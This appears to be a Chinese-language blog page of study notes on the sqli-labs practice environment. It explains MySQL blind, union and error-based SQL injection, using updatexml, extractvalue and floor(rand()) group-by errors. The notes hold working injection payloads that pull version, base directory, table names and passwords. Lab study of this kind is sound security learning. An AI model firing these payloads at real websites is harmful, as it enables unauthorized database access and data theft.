<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 测试</span></span><br><span class="line">1+and+case+when+(1=1)+then+sleep(1)+else+1+<span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 出数据</span></span><br><span class="line"><span class="number">1</span>+<span class="keyword">and</span>+<span class="keyword">case</span>+<span class="keyword">when</span>+(<span class="keyword">left</span>((<span class="keyword">select</span>+<span class="keyword">version</span>()),<span class="number">1</span>)=<span class="string">'5'</span>)+<span class="keyword">then</span>+<span class="keyword">sleep</span>(<span class="number">1</span>)+<span class="keyword">else</span>+<span class="number">1</span>+<span class="keyword">end</span></span><br><span class="line">	- <span class="keyword">left</span>(<span class="keyword">str</span>,<span class="keyword">length</span>)</span><br><span class="line">  - <span class="keyword">substr</span>(<span class="keyword">str</span>,<span class="keyword">start</span>,[<span class="keyword">length</span>])</span><br><span class="line">  	+ <span class="keyword">start</span> 开始位置，默认是从<span class="number">1</span>开始</span><br><span class="line">    + <span class="keyword">length</span>是返回字符串的长度，不可为负数</span><br></pre></td></tr></table></figure>

<h1 id="less-1：Error-Based-String"><a href="#less-1：Error-Based-String" class="headerlink" title="less-1：Error Based- String"></a>less-1：Error Based- String</h1><h2 id="联合注-2"><a href="#联合注-2" class="headerlink" title="联合注"></a>联合注</h2><p>之所以<code>id=1</code>时，不出数据，是因为源码中 31 行的<code>**mysql_fetch_array()**</code>函数只取 1 行，</p>
<blockquote>
<p><strong>mysql_fetch_array</strong>() 函数从结果集中取得一行作为关联数组</p>
</blockquote>
<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1586286240874-ee453d74-bf47-4b77-8b5e-6ecdeeaa5cb6.png#align=left&display=inline&height=133&margin=%5Bobject%20Object%5D&name=image.png&originHeight=266&originWidth=740&size=50404&status=done&style=none&width=370" alt="image.png"><br>假如直接执行<code>id=1</code>的话，是有两行结果的，我们想执行的查询在第 2 行，所以就拿不到结果。<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1586286614284-2d46cd91-aa37-4933-bd80-f0b0370db1a3.png#align=left&display=inline&height=240&margin=%5Bobject%20Object%5D&name=image.png&originHeight=480&originWidth=952&size=29725&status=done&style=none&width=476" alt="image.png"><br>因此，才需要让<code>id</code>等于一个不存在的值（如-1），使<code>mysql</code>只返回我们想要的查询结果.</p>
<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1586286830896-64bed519-3b4e-4aab-9659-1652de1e3b94.png#align=left&display=inline&height=203&margin=%5Bobject%20Object%5D&name=image.png&originHeight=406&originWidth=936&size=25839&status=done&style=none&width=468" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1586286876950-da58195a-4a74-4bb7-b37c-3c10fcd05889.png#align=left&display=inline&height=205&margin=%5Bobject%20Object%5D&name=image.png&originHeight=409&originWidth=1597&size=106234&status=done&style=none&width=798.5" alt="image.png"><br>此外，<code>1,2,3-- #</code>中，<code>-- #</code>的作用是注释掉后面的语句，<code>--</code>与<code>#</code>之间必须有一个空格，否则会报错。更正为如下</p>
<blockquote>
<p>注意：一定要在注释符号后加空格，或者 URL 编码后的空格（%20），否则注释符号不会产生作用。#号换成其它符号也可</p>
</blockquote>
<h2 id="报错注-2"><a href="#报错注-2" class="headerlink" title="报错注"></a>报错注</h2><p>参考资料</p>
<ul>
<li><a href="https://www.cnblogs.com/wocalieshenmegui/p/5917967.html" target="_blank" rel="noopener">十种 MySQL 报错注入</a></li>
</ul>
<p>可用的 payload 主要有以下几类</p>
<h3 id="XPATH-语法错误"><a href="#XPATH-语法错误" class="headerlink" title="XPATH 语法错误"></a>XPATH 语法错误</h3><p>报错信息是有长度限制的，在<code>mysql/my_error.c</code>中可以看到：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* Max length of a error message. Should be</span><br><span class="line">kept in sync with MYSQL_ERRMSG_SIZE. *&#x2F;</span><br><span class="line">#define ERRMSGSIZE (512)</span><br></pre></td></tr></table></figure>

<h4 id="UpdateXml-1-QUERY-1"><a href="#UpdateXml-1-QUERY-1" class="headerlink" title="UpdateXml(1,(QUERY),1)"></a>UpdateXml(1,(QUERY),1)</h4><blockquote>
<p>UPDATEXML (XML_document, XPath_string, new_value);<br>第一个参数：XML_document 是 String 格式，为 XML 文档对象的名称，文中为 Doc<br>第二个参数：XPath_string *<em>(要求是 Xpath 格式的字符串) *</em>，如果不了解 Xpath 语法，可以在网上查找教程。<br>第三个参数：new_value，String 格式，替换查找到的符合条件的数据<br>作用：改变文档中符合条件的节点的值</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1 and pdatexml(1,(QUERY),1)</span><br><span class="line">1 and 1=(updatexml(1,(QUERY),1))  //updatexml左右的括号可要可不要</span><br><span class="line"></span><br><span class="line">id=1' and '1'=(updatexml('2',concat('~',(<span class="keyword">select</span> @@basedir),<span class="string">'~'</span>),<span class="string">'2'</span>))<span class="comment">-- 1</span></span><br><span class="line"><span class="keyword">id</span>=<span class="number">0</span><span class="string">' and updatexml(2,concat('</span>~<span class="string">',(select version()),'</span>~<span class="string">'),2)-- 1</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1586288624828-52c2c0b3-992c-43a4-917e-cdbaad5d7bc6.png#align=left&display=inline&height=223&margin=%5Bobject%20Object%5D&name=image.png&originHeight=447&originWidth=1525&size=197231&status=done&style=none&width=762.5" alt="image.png"></p>
<h4 id="ExtractValue-1-QUERY"><a href="#ExtractValue-1-QUERY" class="headerlink" title="ExtractValue(1,(QUERY))"></a>ExtractValue(1,(QUERY))</h4><blockquote>
<p><a href="https://yq.aliyun.com/go/articleRenderRedirect?spm=a2c4e.11153940.0.0.34f261feypnf9U&url=https%3A%2F%2Fdev.mysql.com%2Fdoc%2Frefman%2F5.7%2Fen%2Fxml-functions.html%23function_extractvalue" target="_blank" rel="noopener"><code>ExtractValue(xml_frag, xpath_expr)</code></a> &gt; <a href="https://yq.aliyun.com/go/articleRenderRedirect?url=https%3A%2F%2Fdev.mysql.com%2Fdoc%2Frefman%2F5.7%2Fen%2Fxml-functions.html%23function_extractvalue" target="_blank" rel="noopener"><code>ExtractValue()</code></a>接受两个字符串参数，一个 XML 标记片段 <em>xml_frag</em>和一个 XPath 表达式 <strong><em>xpath_expr</em></strong>（也称为 定位器）; 如果它存在语法错误，sql 就会把错误显示出来。</p>
</blockquote>
<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1586354275997-58cabcfa-f20c-47e3-89c0-6fca31b64ef2.png#align=left&display=inline&height=156&margin=%5Bobject%20Object%5D&name=image.png&originHeight=311&originWidth=1365&size=84535&status=done&style=none&width=682.5" alt="image.png"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1%27%20and%20extractvalue(1,%20concat(0x5c,%20(<span class="keyword">select</span>%<span class="number">20</span>table_name%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span>information_schema.tables%<span class="number">20</span><span class="keyword">limit</span>%<span class="number">201</span>),%<span class="number">27</span>~%<span class="number">27</span>));<span class="comment">--%20-</span></span><br></pre></td></tr></table></figure>

<h3 id="主键重复"><a href="#主键重复" class="headerlink" title="主键重复"></a>主键重复</h3><h4 id="floor"><a href="#floor" class="headerlink" title="floor"></a>floor</h4><blockquote>
<p>_  通过 floor 报错【没有任何字符长度限制】 需要数据表里有三条以上的数据_ &gt; <a href="https://xz.aliyun.com/t/253#toc-2" target="_blank" rel="noopener">https:/</a><a href="https://xz.aliyun.com/t/253#toc-2" target="_blank" rel="noopener">/xz.aliyun.com/t/253#toc-2</a></p>
</blockquote>
<p>先看一段常用的<code>payload</code></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0 union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">from</span>( <span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="keyword">version</span>(),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x )a<span class="comment">-- -</span></span><br></pre></td></tr></table></figure>

<p>主要是由于<code>count(*)</code>、<code>rand()</code> 、 <code>group by</code>  这三个函数连用造成的<strong>主键重复</strong>问题</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">floor(x) 函数，向下取整,返回一个不大于x的值</span><br><span class="line">round(x,d) 函数，根据四舍五入保留指定的小数位数，x指要处理的数，d是指保留几位小数。</span><br><span class="line">rand() 函数，产生一个0-1之间的随机浮点数，若有参数x，则返回一个x对应的固定的值</span><br></pre></td></tr></table></figure>

<p>首先，先看<code>floor(rand(0)*2))</code>，它是个开头为<code>0 1 1 0 1 1</code>的固定序列</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select floor(rand(0)*2) from test;</span><br><span class="line">+------------------+</span><br><span class="line">| floor(rand(0)*2) |</span><br><span class="line">+------------------+</span><br><span class="line">|                0 |</span><br><span class="line">|                1 |</span><br><span class="line">|                1 |</span><br><span class="line">|                0 |</span><br><span class="line">|                1 |</span><br><span class="line">|                1 |</span><br><span class="line">+------------------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p><code>group by key</code>是对进行数据进行分组统计，效果如下图所示。很容易看清楚，它是不允许 key 值重复的（也就所下图中的 name 列），如果重复就会报错<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1586409955539-b1006041-5c09-41b9-bee0-a7f10184fa95.png#align=left&display=inline&height=421&margin=%5Bobject%20Object%5D&name=image.png&originHeight=842&originWidth=877&size=74007&status=done&style=none&width=438.5" alt="image.png"><br>同时<code>group by</code>它的原理是循环读取数据的每一行，将结果保存于虚拟表中。这个虚拟表读取每一行的 key 时会有如下的逻辑：</p>
<ul>
<li>如果<strong>判断</strong>key 已存在于临时表中，<strong>不插入</strong>数据；</li>
<li>如果<strong>判断</strong>key 不在临时表中，则在临时表中<strong>插入</strong>当前行的数据</li>
</ul>
<p>刚刚说到，<code>floor(rand(0)*2)</code>这个值不是常量，是会在<code>0 1</code>这两个值中间变动的，这就导致<code>group by</code>在执行<strong>判断</strong>与<strong>插入</strong>这两个操作时，标准都已经变了！<del>（这一秒你以为我是 0，其实下一秒我就成了 1，没想到吧哈哈）</del><br>~~<br>此外，为何要在<code>payload</code>中用<code>x</code>和<code>a</code>来占位，实际上这是表的别名(<code>alias</code>)，等同于<code>as x</code>（下图有运行效果），在子查询中得用，不然会报这个错<code>Every derived table must have its own alias</code><br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1586354642583-bf8fc31a-6698-46c5-9878-931674632223.png#align=left&display=inline&height=182&margin=%5Bobject%20Object%5D&name=image.png&originHeight=364&originWidth=565&size=18845&status=done&style=none&width=282.5" alt="image.png">)<img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1586354668898-70056c04-f192-4b86-b4eb-72c48ddb18e1.png#align=left&display=inline&height=175&margin=%5Bobject%20Object%5D&name=image.png&originHeight=349&originWidth=642&size=20862&status=done&style=none&width=321" alt="image.png"></p>
<p><a href="https://xz.aliyun.com/t/253#toc-2" target="_blank" rel="noopener">MYSQL 报错注入的一点总结 - 先知社区</a></p>
<h3 id="大数溢出"><a href="#大数溢出" class="headerlink" title="大数溢出"></a>大数溢出</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring()</span><br></pre></td></tr></table></figure>

<blockquote>
<p>一说在 mysql&gt;5.5.53 时，则不能返回查询结果<br>二说在版本号为 5.5.47 上可以用来注入，而在 5.7.17 上则不行：<br><a href="https://xz.aliyun.com/t/253#toc-4" target="_blank" rel="noopener">https://xz.aliyun.com/t/253#toc-4</a><br>总结：在高版本 mysql 上不可</p>
</blockquote>
<h1 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h1><ul>
<li>distinct 去除重复项</li>
</ul>
<p><strong><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1586353989124-f5a8bb4e-374d-4d36-8677-89869f68a1f0.png#align=left&display=inline&height=429&margin=%5Bobject%20Object%5D&name=image.png&originHeight=858&originWidth=839&size=48179&status=done&style=none&width=419.5" alt="image.png"></strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">distinct</span> <span class="keyword">concat</span>(<span class="number">0x7e</span>, (<span class="keyword">select</span> <span class="keyword">password</span>),<span class="number">0x7e</span>) <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">-- -</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>group_concat</code> 合并多行结果在一行显示, <code>group_concat</code>后可以不跟<code>group</code> by，但里面必须跟列名，而不能跟子查询</li>
<li>报错注入里，必须要用<code>concat(&quot;~&quot;, [QUERY] , &quot;~&quot;)</code>将其左边、右边字符串化，否则会导致回显不全</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1586502391261-1de189fb-efe1-442f-a013-477a60f3ffd4.png#align=left&display=inline&height=105&margin=%5Bobject%20Object%5D&name=image.png&originHeight=210&originWidth=1646&size=30517&status=done&style=none&width=823" alt="image.png">)<img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1586502428533-fc953746-ff26-4b14-b545-37e70f914275.png#align=left&display=inline&height=68&margin=%5Bobject%20Object%5D&name=image.png&originHeight=136&originWidth=1492&size=26395&status=done&style=none&width=746" alt="image.png"></p>
<ul>
<li><code>-- -</code>中在浏览器是空格，在 burp 里是加号<code>+</code></li>
</ul>
<h1 id="部署说明"><a href="#部署说明" class="headerlink" title="部署说明"></a>部署说明</h1><ul>
<li><a href="https://github.com/alecshan/sqli-labs-for-docker" target="_blank" rel="noopener">https://github.com/alecshan/sqli-labs-for-docker</a></li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/2/">&lt;i class&#x3D;&quot;fa fa-angle-left&quot;&gt;&lt;&#x2F;i&gt;</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/4/">&lt;i class&#x3D;&quot;fa fa-angle-right&quot;&gt;&lt;&#x2F;i&gt;</a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">Unc1e</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/%20%7C%7C%20archive">
              
                  <span class="site-state-item-count">19</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            

            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Unc1e</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
